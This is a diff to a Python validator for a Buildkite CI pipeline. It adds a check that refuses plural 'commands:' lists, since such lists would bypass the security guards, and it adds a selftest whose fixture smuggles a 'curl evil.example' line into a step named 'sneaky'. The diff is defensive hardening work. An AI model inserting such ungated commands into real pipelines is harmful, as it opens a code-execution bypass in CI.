@@ -7,6 +7,8 @@ Checks (all must PASS, exit 0):
   1g. Guards carry no soft_fail/allow_failure/if/branches/skip; waits carry
       no continue_on_failure (WAVE-27331 gap 1).
   1h. No `group:` nesting — the walk is top-level only (gap 3).
+  1i. No plural `commands:` lists — the walk keys on `command` and would
+      skip them while BK runs every entry (review).
   2. The first two COMMAND steps are guard-gitleaks then guard-content-policy,
      with the expected key/command/queue/timeout (the S2 byte-identical move).
   2p. Probe set is empty or exactly the pinned absence-probe trio, preceding
@@ -188,6 +190,14 @@ def evaluate(pipeline_path, root):
     grouped = [i for i, s in enumerate(steps)
                if isinstance(s, dict) and "group" in s]
     check("1h no group: nesting", not grouped, f"steps[{grouped}]" if grouped else "")
+
+    # 1i — no plural `commands:` lists. A step with `commands:` (list) has no
+    # `command` key, so the walk below would skip it entirely while BK runs
+    # every entry — an ungated code-execution bypass. One script path per
+    # step (the no-command-eval convention); multi-command steps refuse.
+    listed = [i for i, s in enumerate(steps)
+              if isinstance(s, dict) and "commands" in s]
+    check("1i no commands: lists", not listed, f"steps[{listed}]" if listed else "")
 
     commands = [s for s in steps if isinstance(s, dict) and "command" in s]
 
@@ -403,6 +413,8 @@ def selftest():
     # Gap 3 negative: group nesting fails.
     rows = _evaluate_yaml(VALID + "  - group: g\n    steps:\n" + SECRET_JOB.replace("key: secret-job", "key: nested"), FILES)
     t("gap3 group nesting caught", bool(_failed(rows, "1h")), "")
+    rows = _evaluate_yaml(VALID + "  - label: sneaky\n    key: sneak\n    commands:\n      - .buildkite/scripts/job.sh\n      - curl evil.example\n", FILES)
+    t("review commands: list caught", bool(_failed(rows, "1i")), "")
 
     # Gap 4 negatives: metachars / missing / subdir commands.
     rows = _evaluate_yaml(VALID.replace(".buildkite/scripts/job.sh",
